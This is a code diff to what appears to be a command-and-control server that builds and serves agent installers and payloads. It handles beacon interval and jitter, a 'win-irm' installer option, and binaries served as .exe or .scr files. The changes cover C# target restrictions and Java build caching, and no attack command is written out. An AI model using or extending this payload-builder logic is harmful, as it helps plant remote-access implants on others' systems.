@@ -1484,6 +1484,13 @@ def generate_post(
 
     installer_shell, payload_kind = _normalize_payload(shell_os)
 
+    # C# agents run on .NET, which is not available on Linux/macOS targets; a
+    # Unix payload would only ever produce a dotnet-script one-liner that can
+    # not run there, so C# stays Windows-only end to end.
+    if language == "csharp" and installer_shell != "windows":
+        raise HTTPException(status_code=400,
+            detail="C# agents require .NET -- only Windows payloads/targets are supported")
+
     # Compact payload + viewable installer source (config embedded).
     # Every config value (server, token, interval, jitter, verbose, shell OS)
     # is baked into the installer script body. The rendered body is stored so
@@ -1968,8 +1975,12 @@ async def download_agent_installer(request: Request, language: str,
     base = server.strip().rstrip("/") or str(request.base_url).rstrip("/")
     raw_shell = request.query_params.get("shell_os", "")
     if not raw_shell:
-        raw_shell = "unix" if language in COMPILED_LANGUAGES else "win-irm"
+        raw_shell = ("win-irm" if language == "csharp" else
+                     "unix" if language in COMPILED_LANGUAGES else "win-irm")
     installer_shell, _ = _normalize_payload(raw_shell)
+    if language == "csharp" and installer_shell != "windows":
+        raise HTTPException(status_code=400,
+            detail="C# agents require .NET -- only Windows payloads/targets are supported")
     body = _build_installer(
         language=language,
         server=base,
@@ -2275,17 +2286,19 @@ def _build_binary_locked(language: str, target: str = "", on_line=None) -> tuple
     ext = t["ext"]
     # Unique-per-source artifact naming: wym_<lang>_<os>_<arch>_<srcid><ext>
     # (java keeps a platform-neutral stem). The short source-hash suffix makes
-    # every distinct build a distinct file, so the cache check collapses to
-    # "the file exists" — an up-to-date name can never shadow another build.
+    # every distinct source a distinct file, so the cheap cache check collapses
+    # to "the file exists". Java jars are cheap to build: they additionally get
+    # a timestamp so every server-side build is its own unique artifact.
     build_id = _source_hash(language)[:8]
     if language == "java":
-        # A JAR is platform-independent but still gets the src-id suffix.
-        out_path = BUILDS_DIR / _artifact_name(language, target, ".jar", build_id)
+        id_suffix = f"{build_id}_{time.strftime('%Y%m%d-%H%M%S')}"
+        out_path = BUILDS_DIR / _artifact_name(language, target, ".jar", id_suffix)
     else:
+        id_suffix = build_id
         out_path = BUILDS_DIR / _artifact_name(language, target, ext, build_id)
-    hash_path = BUILDS_DIR / f"{_artifact_stem(language, target)}_{build_id}.hash"
+    hash_path = BUILDS_DIR / f"{_artifact_stem(language, target)}_{id_suffix}.hash"
 
-    if out_path.is_file():
+    if language != "java" and out_path.is_file():
         note(f"[cache hit] reusing {out_path.name}")
         return out_path, ""
     hash_path.unlink(missing_ok=True)
@@ -2708,16 +2721,29 @@ async def download_build(request: Request, language: str, target: str = "win_x64
         raise HTTPException(status_code=400, detail="unknown target")
     # on-disk artifact carries the platform default extension plus the source-
     # id suffix; the served filename may carry a requested (.exe/.scr/.out/…)
-    # extension instead.
+    # extension instead. Java artifacts are unique per build (src-id +
+    # timestamp): serve the newest, or an exact one named via ?name=.
     build_id = _source_hash(language)[:8]
     if language == "java":
-        path = BUILDS_DIR / _artifact_name(language, target, ".jar", build_id)
-        fname = _artifact_name(language, target, ".jar", build_id)
+        req_name = (request.query_params.get("name") or "").strip()
+        if req_name:
+            p = BUILDS_DIR / req_name
+            if not re.fullmatch(r"wym_java_[0-9a-f]{8}_\d{8}-\d{6}\.jar", req_name) \
+                    or not p.is_file():
+                raise HTTPException(status_code=404, detail="binary not found")
+            path = p
+        else:
+            cands = sorted(BUILDS_DIR.glob(f"wym_java_{build_id}_*.jar"))
+            if not cands:
+                raise HTTPException(status_code=404,
+                                    detail="binary not found — build first")
+            path = cands[-1]
+        fname = path.name
     else:
         path = BUILDS_DIR / _artifact_name(language, target, t["ext"], build_id)
         fname = _artifact_name(language, target, ext or t["ext"], build_id)
-    if not path.is_file():
-        raise HTTPException(status_code=404, detail="binary not found — build first")
+        if not path.is_file():
+            raise HTTPException(status_code=404, detail="binary not found — build first")
     return FileResponse(path, media_type="application/octet-stream", filename=fname)
 
 
